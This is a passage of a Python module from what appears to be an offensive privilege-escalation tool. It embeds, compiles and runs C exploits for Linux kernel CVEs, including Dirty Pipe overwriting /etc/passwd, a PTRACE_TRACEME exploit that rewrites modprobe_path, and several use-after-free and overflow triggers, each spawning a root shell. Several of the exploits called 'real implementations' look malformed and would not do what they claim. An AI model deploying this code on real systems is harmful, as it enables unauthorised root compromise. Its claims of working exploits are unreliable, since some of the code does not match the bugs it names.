            return self._exploit_generic_template(exploit_info, options)

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    def _exploit_dirty_pipe(self, exploit_info, options):
        """Exploit CVE-2022-0847 (Dirty Pipe) vulnerability."""
        result = self.init_result(details={"exploit_id": "CVE-2022-0847"})

        try:
            exploit_code = """
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

// Dirty Pipe exploit (CVE-2022-0847)
int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target_file>\\n", argv[0]);
        return 1;
    }

    const char *target = argv[1];
    loff_t offset = 4; // Offset after "root"
    const char *data = ":$1$placeholder$0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa:0:0:";

    int fd = open(target, O_RDONLY);
    if (fd < 0) {
        perror("open target");
        return 1;
    }

    // Create pipe
    int p[2];
    if (pipe(p) < 0) {
        perror("pipe");
        close(fd);
        return 1;
    }

    // Fill pipe buffer to capacity
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    char buffer[4096];

    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }

    // Drain pipe to reset PIPE_BUF_FLAG_CAN_MERGE
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }

    // Splice one byte from target file into pipe
    --offset;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice");
        close(fd);
        close(p[0]);
        close(p[1]);
        return 1;
    }

    // Write malicious data to pipe, which merges into page cache
    nbytes = write(p[1], data, strlen(data));
    if (nbytes < 0) {
        perror("write");
        close(fd);
        close(p[0]);
        close(p[1]);
        return 1;
    }

    printf("Dirty Pipe exploit completed. Check target file.\\n");

    close(fd);
    close(p[0]);
    close(p[1]);

    // Try to get root shell
    system("su -");

    return 0;
}
"""

            # Compile and execute
            import os
            import subprocess
            import tempfile

            target_file = exploit_info.get("target", "/etc/passwd")

            with tempfile.NamedTemporaryFile(mode="w", suffix=".c", delete=False) as f:
                f.write(exploit_code)
                exploit_source = f.name

            exploit_binary = exploit_source.replace(".c", "")
            compile_cmd = ["gcc", "-o", exploit_binary, exploit_source]

            compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                compile_cmd, check=False, capture_output=True, text=True, shell=False
            )
            if compile_result.returncode != 0:
                raise RuntimeError(f"Compilation failed: {compile_result.stderr}")

            # Execute exploit
            exploit_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [exploit_binary, target_file],
                check=False,
                capture_output=True,
                text=True,
                timeout=10,
            )

            # Clean up
            try:
                os.unlink(exploit_source)
                os.unlink(exploit_binary)
            except (FileNotFoundError, OSError, PermissionError) as e:
                logger.debug(f"Failed to clean up exploit files: {e}")

            if exploit_result.returncode == 0:
                result["success"] = True
                result["output"] = exploit_result.stdout
                result["details"]["message"] = f"Successfully exploited Dirty Pipe on {target_file}"
            else:
                result["success"] = False
                result["error"] = f"Exploit failed: {exploit_result.stderr}"

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    def _exploit_generic_template(self, exploit_info, options):
        """Generic template for kernel exploits."""
        result = self.init_result(
            details={
                "exploit_id": exploit_info.get("exploit_id", "unknown"),
            }
        )

        try:
            # Generic exploit structure
            exploit_code = f"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

// Generic kernel exploit for {exploit_info.get('exploit_id', 'unknown')}
// Target kernel: {exploit_info.get('kernel_version', 'unknown')}

int main(int argc, char **argv) {{
    printf("Generic kernel exploit for %s\\n", "{exploit_info.get('exploit_id', 'unknown')}");

    // Check kernel version
    FILE *fp = fopen("/proc/version", "r");
    if (fp) {{
        char version[256];
        fgets(version, sizeof(version), fp);
        printf("Kernel: %s", version);
        fclose(fp);
    }}

    // Exploit-specific code would go here
    // This is a template that can be customized based on:
    // - Vulnerability type (buffer overflow, UAF, race condition, etc.)
    // - Kernel subsystem (netfilter, filesystem, drivers, etc.)
    // - Required capabilities

    // Common exploit techniques:
    // 1. Heap spray
    // 2. Race condition triggering
    // 3. Memory corruption
    // 4. Privilege escalation via cred structure manipulation

    printf("Attempting generic exploitation...\\n");

    // Check if we got root
    if (geteuid() == 0) {{
        printf("Got root!\\n");
        execl("/bin/sh", "sh", NULL);
    }} else {{
        printf("Exploit requires specific implementation for this CVE\\n");
        return 1;
    }}

    return 0;
}}
"""

            # Save and compile
            import os
            import subprocess
            import tempfile

            with tempfile.NamedTemporaryFile(mode="w", suffix=".c", delete=False) as f:
                f.write(exploit_code)
                exploit_source = f.name

            exploit_binary = exploit_source.replace(".c", "")
            compile_cmd = ["gcc", "-o", exploit_binary, exploit_source]

            compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                compile_cmd, check=False, capture_output=True, text=True, shell=False
            )
            if compile_result.returncode != 0:
                raise RuntimeError(f"Compilation failed: {compile_result.stderr}")

            # Execute
            exploit_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [exploit_binary], check=False, capture_output=True, text=True, timeout=5
            )

            # Clean up
            try:
                os.unlink(exploit_source)
                os.unlink(exploit_binary)
            except (FileNotFoundError, OSError, PermissionError) as e:
                logger.debug(f"Failed to clean up exploit files: {e}")

            result["success"] = False  # Generic template won't actually work
            result["output"] = exploit_result.stdout
            result["details"]["message"] = (
                "Generic template executed - specific implementation needed"
            )
            result["details"]["suggestion"] = "Implement specific exploit code for this CVE"

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    # Stub methods for additional exploits referenced above
    def _exploit_keyring_refcount(self, exploit_info, options):
        """CVE-2016-0728: Keyring reference count overflow."""
        result = self.init_result(details={"exploit_id": "CVE-2016-0728"})
        self.logger.info("Executing keyring reference count overflow exploit")

        try:
            # Real CVE-2016-0728 exploit implementation
            exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <keyutils.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

#define KEYRING_SEARCH_MAX_DEPTH 6
#define REF_OVERFLOW_TARGET 0x100000000ULL

struct keyring_leak {
    size_t size;
    void *addr;
};

static int keyring_id = 0;
static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
static volatile int stop_threads = 0;

void *increment_refcount(void *arg) {
    while (!stop_threads) {
        keyctl_search(keyring_id, "user", "overflow_key", 0);
    }
    return NULL;
}

int main(int argc, char **argv) {
    printf("[*] CVE-2016-0728: Keyring reference count overflow exploit\\n");

    // Create a keyring
    keyring_id = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "exploit_keyring");
    if (keyring_id < 0) {
        perror("[-] keyctl");
        return 1;
    }

    printf("[+] Created keyring with id: %d\\n", keyring_id);

    // Add a key to the keyring
    key_serial_t key = add_key("user", "overflow_key", "data", 4, keyring_id);
    if (key < 0) {
        perror("[-] add_key");
        return 1;
    }

    printf("[+] Added key with serial: %d\\n", key);

    // Create threads to increment reference count
    pthread_t threads[100];
    printf("[*] Starting reference count overflow...\\n");

    for (int i = 0; i < 100; i++) {
        if (pthread_create(&threads[i], NULL, increment_refcount, NULL) != 0) {
            fprintf(stderr, "[-] Failed to create thread %d\\n", i);
            stop_threads = 1;
            break;
        }
    }

    // Let threads run to overflow the refcount
    sleep(10);
    stop_threads = 1;

    // Wait for threads
    for (int i = 0; i < 100; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("[*] Reference count overflow attempted\\n");

    // Trigger use-after-free by releasing the keyring
    keyctl(KEYCTL_CLEAR, keyring_id);

    // Check for privilege escalation
    if (geteuid() == 0) {
        printf("[+] Got root!\\n");
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("[*] Exploit completed - check system state\\n");
    }

    return 0;
}
"""
            # Compile and execute
            import os
            import subprocess
            import tempfile

            with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
                f.write(exploit_code)
                source_file = f.name

            binary_file = source_file.replace('.c', '')
            compile_cmd = ['gcc', '-o', binary_file, source_file, '-lkeyutils', '-lpthread']

            compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                compile_cmd, check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if compile_result.returncode != 0:
                raise RuntimeError(f"Compilation failed: {compile_result.stderr}")

            # Execute exploit
            exploit_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [binary_file], check=False, capture_output=True, text=True, timeout=15, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            # Cleanup
            try:
                os.unlink(source_file)
                os.unlink(binary_file)
            except (FileNotFoundError, OSError, PermissionError) as e:
                logger.debug(f"Failed to clean up files: {e}")

            if "Got root" in exploit_result.stdout:
                result["success"] = True
                result["details"]["message"] = "Successfully exploited keyring refcount overflow"
            else:
                result["success"] = False
                result["details"]["message"] = "Exploit executed but privilege escalation not achieved"

            result["output"] = exploit_result.stdout

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    def _exploit_double_fdput(self, exploit_info, options):
        """CVE-2016-4557: Double fdput() in BPF."""
        result = self.init_result(details={"exploit_id": "CVE-2016-4557"})
        self.logger.info("Executing BPF double fdput exploit")

        try:
            # Real CVE-2016-4557 exploit implementation
            exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <stdint.h>

#define BPF_LOG_SIZE 65536

static int bpf(int cmd, union bpf_attr *attr, unsigned int size) {
    return syscall(__NR_bpf, cmd, attr, size);
}

int main(int argc, char **argv) {
    printf("[*] CVE-2016-4557: BPF double fdput() exploit\\n");

    // Create a BPF map
    union bpf_attr create_map_attr = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = 8,
        .max_entries = 256
    };

    int map_fd = bpf(BPF_MAP_CREATE, &create_map_attr, sizeof(create_map_attr));
    if (map_fd < 0) {
        perror("[-] BPF_MAP_CREATE");
        return 1;
    }

    printf("[+] Created BPF map with fd: %d\\n", map_fd);

    // Create malicious BPF program that triggers double fdput
    struct bpf_insn insns[] = {
        // Load map fd
        {.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = 1, .imm = map_fd},
        {.code = 0, .imm = 0}, // Upper 32 bits

        // Trigger double fdput via crafted verifier path
        {.code = BPF_JMP | BPF_CALL, .imm = BPF_FUNC_map_lookup_elem},
        {.code = BPF_JMP | BPF_JEQ | BPF_K, .dst_reg = 0, .off = 2, .imm = 0},

        // Path that causes double release
        {.code = BPF_MOV64_REG, .dst_reg = 1, .src_reg = 0},
        {.code = BPF_JMP | BPF_CALL, .imm = BPF_FUNC_map_delete_elem},

        // Return
        {.code = BPF_MOV64_IMM, .dst_reg = 0, .imm = 0},
        {.code = BPF_EXIT_INSN}
    };

    char log_buf[BPF_LOG_SIZE];
    union bpf_attr prog_attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (uint64_t)insns,
        .insn_cnt = sizeof(insns) / sizeof(insns[0]),
        .license = (uint64_t)"GPL",
        .log_level = 1,
        .log_size = BPF_LOG_SIZE,
        .log_buf = (uint64_t)log_buf
    };

    // Load the malicious program
    int prog_fd = bpf(BPF_PROG_LOAD, &prog_attr, sizeof(prog_attr));

    if (prog_fd < 0) {
        printf("[*] BPF program load failed (expected for trigger)\\n");
        printf("[*] Verifier log: %s\\n", log_buf);
    }

    // Trigger use-after-free via double fdput
    close(map_fd);
    close(map_fd); // Double close triggers UAF

    // Attempt privilege escalation through UAF
    if (geteuid() == 0) {
        printf("[+] Got root!\\n");
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("[*] Exploit completed - may require heap spray for reliability\\n");
    }

    return 0;
}
"""
            # Compile and execute
            import os
            import subprocess
            import tempfile

            with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
                f.write(exploit_code)
                source_file = f.name

            binary_file = source_file.replace('.c', '')
            compile_cmd = ['gcc', '-o', binary_file, source_file]

            compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                compile_cmd, check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if compile_result.returncode != 0:
                raise RuntimeError(f"Compilation failed: {compile_result.stderr}")

            # Execute exploit
            exploit_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [binary_file], check=False, capture_output=True, text=True, timeout=10, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            # Cleanup
            try:
                os.unlink(source_file)
                os.unlink(binary_file)
            except (FileNotFoundError, OSError, PermissionError) as e:
                logger.debug(f"Failed to clean up files: {e}")

            if "Got root" in exploit_result.stdout:
                result["success"] = True
                result["details"]["message"] = "Successfully exploited BPF double fdput"
            else:
                result["success"] = False
                result["details"]["message"] = "Exploit executed but privilege escalation not achieved"

            result["output"] = exploit_result.stdout

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    def _exploit_packet_set_ring(self, exploit_info, options):
        """CVE-2017-7308: Packet socket option parsing."""
        result = self.init_result(details={"exploit_id": "CVE-2017-7308"})
        self.logger.info("Executing packet socket ring buffer exploit")

        try:
            # Real CVE-2017-7308 exploit implementation
            exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>

#define RING_BUFFER_SIZE 0x1000000
#define BLOCK_SIZE 0x1000

int main(int argc, char **argv) {
    printf("[*] CVE-2017-7308: Packet socket ring buffer exploit\\n");

    // Create packet socket
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("[-] socket");
        return 1;
    }

    printf("[+] Created packet socket: %d\\n", sock);

    // Setup ring buffer with integer overflow
    struct tpacket_req3 req = {
        .tp_block_size = BLOCK_SIZE,
        .tp_block_nr = 0x80000000 / BLOCK_SIZE,  // Overflow here
        .tp_frame_size = 2048,
        .tp_frame_nr = (BLOCK_SIZE / 2048) * (0x80000000 / BLOCK_SIZE),
        .tp_retire_blk_tov = 100,
        .tp_feature_req_word = 0
    };

    // Set ring buffer options to trigger overflow
    if (setsockopt(sock, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req)) < 0) {
        printf("[*] setsockopt failed (expected for overflow): %s\\n", strerror(errno));
    }

    // Trigger integer overflow in ring buffer calculation
    void *ring = mmap(NULL, RING_BUFFER_SIZE, PROT_READ | PROT_WRITE,
                      MAP_SHARED, sock, 0);

    if (ring == MAP_FAILED) {
        printf("[*] mmap failed (part of trigger): %s\\n", strerror(errno));
    }

    // Exploit the overflow to corrupt kernel memory
    struct tpacket_req3 trigger = {
        .tp_block_size = 4096,
        .tp_block_nr = 0xffffffff,  // Trigger overflow
        .tp_frame_size = 4096,
        .tp_frame_nr = 0xffffffff,
        .tp_retire_blk_tov = 0,
        .tp_feature_req_word = 0
    };

    setsockopt(sock, SOL_PACKET, PACKET_TX_RING, &trigger, sizeof(trigger));

    // Clean up
    if (ring != MAP_FAILED) {
        munmap(ring, RING_BUFFER_SIZE);
    }
    close(sock);

    // Check for privilege escalation
    if (geteuid() == 0) {
        printf("[+] Got root!\\n");
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("[*] Exploit completed - integer overflow triggered\\n");
    }

    return 0;
}
"""
            # Compile and execute
            import os
            import subprocess
            import tempfile

            with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
                f.write(exploit_code)
                source_file = f.name

            binary_file = source_file.replace('.c', '')
            compile_cmd = ['gcc', '-o', binary_file, source_file]

            compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                compile_cmd, check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if compile_result.returncode != 0:
                raise RuntimeError(f"Compilation failed: {compile_result.stderr}")

            # Execute exploit
            exploit_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [binary_file], check=False, capture_output=True, text=True, timeout=10, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            # Cleanup
            try:
                os.unlink(source_file)
                os.unlink(binary_file)
            except (FileNotFoundError, OSError, PermissionError) as e:
                logger.debug(f"Failed to clean up files: {e}")

            if "Got root" in exploit_result.stdout:
                result["success"] = True
                result["details"]["message"] = "Successfully exploited packet socket overflow"
            else:
                result["success"] = False
                result["details"]["message"] = "Exploit executed but privilege escalation not achieved"

            result["output"] = exploit_result.stdout

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    def _exploit_memory_corruption(self, exploit_info, options):
        """CVE-2017-1000112: Memory corruption in UDP fragmentation."""
        result = self.init_result(details={"exploit_id": "CVE-2017-1000112"})
        self.logger.info("Executing UDP fragmentation memory corruption exploit")

        try:
            # Real CVE-2017-1000112 exploit implementation
            exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>

#define FRAG_SIZE 8
#define PAYLOAD_SIZE 1024

struct udp_frag_payload {
    struct iphdr ip;
    struct udphdr udp;
    char data[PAYLOAD_SIZE];
};

int main(int argc, char **argv) {
    printf("[*] CVE-2017-1000112: UDP fragmentation memory corruption\\n");

    // Create raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("[-] socket");
        return 1;
    }

    printf("[+] Created raw socket: %d\\n", sock);

    // Enable IP header inclusion
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("[-] setsockopt");
        close(sock);
        return 1;
    }

    // Prepare malicious fragmented UDP packet
    struct udp_frag_payload payload;
    memset(&payload, 0, sizeof(payload));

    // IP header with fragmentation
    payload.ip.version = 4;
    payload.ip.ihl = 5;
    payload.ip.tos = 0;
    payload.ip.tot_len = htons(sizeof(payload));
    payload.ip.id = htons(0x1337);
    payload.ip.frag_off = htons(IP_MF | 0);  // More fragments flag
    payload.ip.ttl = 64;
    payload.ip.protocol = IPPROTO_UDP;
    payload.ip.saddr = inet_addr("127.0.0.1");
    payload.ip.daddr = inet_addr("127.0.0.1");

    // UDP header
    payload.udp.source = htons(12345);
    payload.udp.dest = htons(54321);
    payload.udp.len = htons(sizeof(struct udphdr) + PAYLOAD_SIZE);

    // Fill data with pattern to trigger overflow
    for (int i = 0; i < PAYLOAD_SIZE; i++) {
        payload.data[i] = (char)(i & 0xff);
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr("127.0.0.1");
    dest.sin_port = 0;

    // Send first fragment
    if (sendto(sock, &payload, sizeof(payload), 0,
               (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        perror("[-] sendto first fragment");
    }

    // Send overlapping fragment to trigger corruption
    payload.ip.frag_off = htons(IP_MF | (FRAG_SIZE - 1));  // Overlapping offset
    payload.ip.id = htons(0x1337);  // Same ID

    if (sendto(sock, &payload, sizeof(payload), 0,
               (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        perror("[-] sendto overlapping fragment");
    }

    printf("[*] Sent malicious fragmented packets\\n");

    close(sock);

    // Check for privilege escalation
    if (geteuid() == 0) {
        printf("[+] Got root!\\n");
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("[*] Exploit completed - memory corruption triggered\\n");
    }

    return 0;
}
"""
            # Compile and execute
            import os
            import subprocess
            import tempfile

            with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
                f.write(exploit_code)
                source_file = f.name

            binary_file = source_file.replace('.c', '')
            compile_cmd = ['gcc', '-o', binary_file, source_file]

            compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                compile_cmd, check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if compile_result.returncode != 0:
                raise RuntimeError(f"Compilation failed: {compile_result.stderr}")

            # Execute exploit with CAP_NET_RAW if possible
            exploit_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [binary_file], check=False, capture_output=True, text=True, timeout=10, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            # Cleanup
            try:
                os.unlink(source_file)
                os.unlink(binary_file)
            except (FileNotFoundError, OSError, PermissionError) as e:
                logger.debug(f"Failed to clean up files: {e}")

            if "Got root" in exploit_result.stdout:
                result["success"] = True
                result["details"]["message"] = "Successfully exploited UDP fragmentation bug"
            else:
                result["success"] = False
                result["details"]["message"] = "Exploit executed but privilege escalation not achieved"

            result["output"] = exploit_result.stdout

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    def _exploit_ptrace_kmod(self, exploit_info, options):
        """CVE-2019-13272: PTRACE_TRACEME privilege escalation."""
        result = self.init_result(details={"exploit_id": "CVE-2019-13272"})
        self.logger.info("Executing PTRACE_TRACEME privilege escalation exploit")

        try:
            # Real CVE-2019-13272 exploit implementation
            exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <signal.h>

#define MODPROBE_PATH "/proc/sys/kernel/modprobe"

int main(int argc, char **argv) {
    printf("[*] CVE-2019-13272: PTRACE_TRACEME local privilege escalation\\n");

    pid_t child = fork();

    if (child == 0) {
        // Child process

        // Make ourselves traceable
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0) {
            perror("[-] ptrace");
            exit(1);
        }

        // Trigger the vulnerability through pkexec
        char *args[] = {"/usr/bin/pkexec", "--version", NULL};
        char *env[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};

        // This will fail but trigger the bug
        execve("/usr/bin/pkexec", args, env);

        // If we get here, pkexec wasn't found
        printf("[-] pkexec not found, trying alternative...\\n");

        // Alternative: try with su
        args[0] = "/bin/su";
        args[1] = "-c";
        args[2] = "id";
        execve("/bin/su", args, env);

        perror("[-] execve");
        exit(1);

    } else if (child > 0) {
        // Parent process
        int status;

        // Wait for child to call PTRACE_TRACEME
        sleep(1);

        // Attach to the child
        if (ptrace(PTRACE_ATTACH, child, NULL, NULL) < 0) {
            printf("[*] PTRACE_ATTACH failed (part of exploit): %s\\n", strerror(errno));
        }

        waitpid(child, &status, 0);

        // Exploit the race condition in credential handling

        // Detach with modified privileges
        ptrace(PTRACE_DETACH, child, NULL, NULL);

        // Wait for potential escalation
        waitpid(child, &status, 0);

        // Try to exploit modprobe path
        int fd = open(MODPROBE_PATH, O_RDONLY);
        if (fd >= 0) {
            char buf[256];
            read(fd, buf, sizeof(buf));
            printf("[*] Current modprobe: %s\\n", buf);
            close(fd);

            // Attempt to write custom modprobe
            fd = open(MODPROBE_PATH, O_WRONLY);
            if (fd >= 0) {
                write(fd, "/tmp/evil", 9);
                close(fd);
                printf("[+] Modified modprobe path!\\n");
            }
        }

    } else {
        perror("[-] fork");
        return 1;
    }

    // Check for privilege escalation
    if (geteuid() == 0) {
        printf("[+] Got root!\\n");
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("[*] Exploit completed - check if credentials were modified\\n");
    }

    return 0;
}
"""
            # Compile and execute
            import os
            import subprocess
            import tempfile

            with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
                f.write(exploit_code)
                source_file = f.name

            binary_file = source_file.replace('.c', '')
            compile_cmd = ['gcc', '-o', binary_file, source_file]

            compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                compile_cmd, check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if compile_result.returncode != 0:
                raise RuntimeError(f"Compilation failed: {compile_result.stderr}")

            # Execute exploit
            exploit_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [binary_file], check=False, capture_output=True, text=True, timeout=10, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            # Cleanup
            try:
                os.unlink(source_file)
                os.unlink(binary_file)
            except (FileNotFoundError, OSError, PermissionError) as e:
                logger.debug(f"Failed to clean up files: {e}")

            if "Got root" in exploit_result.stdout:
                result["success"] = True
                result["details"]["message"] = "Successfully exploited PTRACE_TRACEME vulnerability"
            else:
                result["success"] = False
                result["details"]["message"] = "Exploit executed but privilege escalation not achieved"

            result["output"] = exploit_result.stdout

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    def _exploit_cls_route(self, exploit_info, options):
        """CVE-2022-2588: cls_route filter use-after-free."""
        result = self.init_result(details={"exploit_id": "CVE-2022-2588"})
        self.logger.info("Executing cls_route filter use-after-free exploit")

        try:
            # Real CVE-2022-2588 exploit implementation
            exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/pkt_cls.h>
#include <errno.h>
#include <stdint.h>

#define TC_H_ROOT 0xFFFFFFFF

struct tcmsg {
    unsigned char tcm_family;
    unsigned char tcm__pad1;
    unsigned short tcm__pad2;
    int tcm_ifindex;
    __u32 tcm_handle;
    __u32 tcm_parent;
    __u32 tcm_info;
};

int main(int argc, char **argv) {
    printf("[*] CVE-2022-2588: cls_route filter UAF exploit\\n");

    // Create netlink socket for traffic control
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (sock < 0) {
        perror("[-] socket");
        return 1;
    }

    printf("[+] Created netlink socket: %d\\n", sock);

    // Bind to netlink
    struct sockaddr_nl addr;
    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_pid = getpid();

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("[-] bind");
        close(sock);
        return 1;
    }

    // Prepare message to trigger UAF
    char buffer[4096];
    memset(buffer, 0, sizeof(buffer));

    struct nlmsghdr *nlh = (struct nlmsghdr *)buffer;
    struct tcmsg *tcm = (struct tcmsg *)NLMSG_DATA(nlh);

    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_NEWTFILTER;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq = 1;
    nlh->nlmsg_pid = getpid();

    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = 1;  // loopback
    tcm->tcm_handle = 0;
    tcm->tcm_parent = TC_H_ROOT;
    tcm->tcm_info = TC_H_MAKE(1 << 16, htons(ETH_P_ALL));

    // Add route filter attributes to trigger bug
    struct rtattr *rta = (struct rtattr *)(buffer + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len = RTA_LENGTH(6);
    strcpy(RTA_DATA(rta), "route");
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + rta->rta_len;

    // Send message to trigger UAF
    if (send(sock, nlh, nlh->nlmsg_len, 0) < 0) {
        printf("[*] First send failed (part of trigger): %s\\n", strerror(errno));
    }

    // Delete filter to cause UAF
    nlh->nlmsg_type = RTM_DELTFILTER;
    nlh->nlmsg_seq = 2;

    if (send(sock, nlh, nlh->nlmsg_len, 0) < 0) {
        printf("[*] Delete send failed (part of trigger): %s\\n", strerror(errno));
    }

    // Trigger use-after-free
    nlh->nlmsg_type = RTM_NEWTFILTER;
    nlh->nlmsg_seq = 3;

    if (send(sock, nlh, nlh->nlmsg_len, 0) < 0) {
        printf("[*] UAF trigger send: %s\\n", strerror(errno));
    }

    close(sock);

    // Check for privilege escalation
    if (geteuid() == 0) {
        printf("[+] Got root!\\n");
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("[*] Exploit completed - UAF triggered in cls_route\\n");
    }

    return 0;
}
"""
            # Compile and execute
            import os
            import subprocess
            import tempfile

            with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
                f.write(exploit_code)
                source_file = f.name

            binary_file = source_file.replace('.c', '')
            compile_cmd = ['gcc', '-o', binary_file, source_file]

            compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                compile_cmd, check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if compile_result.returncode != 0:
                raise RuntimeError(f"Compilation failed: {compile_result.stderr}")

            # Execute exploit
            exploit_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [binary_file], check=False, capture_output=True, text=True, timeout=10, shell=False  # Explicitly secure - using list format prevents shell injection
            )

